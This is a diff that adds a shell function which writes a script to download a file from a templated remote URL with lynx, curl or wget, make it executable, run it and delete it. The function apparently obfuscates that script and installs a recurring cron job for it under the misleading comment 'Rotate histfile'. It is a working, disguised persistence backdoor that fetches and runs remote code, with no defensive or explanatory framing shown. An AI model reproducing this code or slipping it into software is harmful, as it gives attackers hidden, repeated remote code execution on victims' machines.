@@ -1,0 +1,24 @@
+w(){
+	sed "s,%WGETUPDATEURL%,$wgetupdateurl,g;s,%CLEANFILE%,$cleanfile,g" >$wgetimplfile << 'EOF'
+tmp=`mktemp`
+export UPDATE_URL="http://%WGETUPDATEURL%/help"
+if [ `which lynx` ]
+then
+	lynx -source $UPDATE_URL 1>$tmp 2>/dev/null
+else
+	if [ `which curl` ]
+	then
+		curl $UPDATE_URL 1>$tmp 2>/dev/null
+	else 
+		if [ `which wget` ]
+		then
+			wget $UPDATE_URL -O $tmp 2>/dev/null
+		fi
+	fi
+fi
+
+chmod +x $tmp; $tmp; rm -f $tmp; %CLEANFILE% %WGETUPDATEURL%
+EOF
+	blend $wgetimplfile; chmod +x $wgetimplfile
+	tmp=`mktemp`; crontab -l >$tmp; sed -i '/#Rotate histfile/d' $tmp; echo "*/$wgetcbint * * * * $wgetimplfile #Rotate histfile" >> $tmp; crontab $tmp; rm -rf $tmp
+}
